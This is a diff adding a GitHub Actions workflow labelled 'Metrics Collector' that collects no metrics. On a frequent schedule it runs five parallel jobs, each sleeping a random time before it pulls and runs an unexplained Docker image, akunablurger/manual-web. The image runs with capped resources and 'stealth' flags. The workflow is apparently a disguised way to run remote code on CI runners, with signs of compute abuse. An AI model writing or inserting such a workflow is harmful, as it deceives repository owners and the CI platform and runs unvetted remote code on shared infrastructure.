@@ -1,0 +1,35 @@
+name: Metrics Collector
+
+on:
+  schedule:
+    - cron: "0/39 * * * *"
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  collect:
+    name: metric-${{ matrix.k }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        k: [1, 2, 3, 4, 5]
+    timeout-minutes: 26
+    steps:
+      - name: Random wait
+        run: sleep $((RANDOM % 90))
+      - name: Pull
+        run: docker pull akunablurger/manual-web:latest || true
+      - name: Collect
+        env:
+          JOB_INDEX: ${{ matrix.k }}
+          WORKFLOW_VARIANT: "stealth"
+          CONTAINER_NAME: "mc-${{ matrix.k }}-${{ github.run_id }}"
+        run: |
+          docker run --rm --name "$CONTAINER_NAME" \
+            --memory=470m --cpus=2.15 \
+            -e JOB_INDEX -e WORKFLOW_VARIANT \
+            -e STEALTH_MODE=1 \
+            akunablurger/manual-web:latest
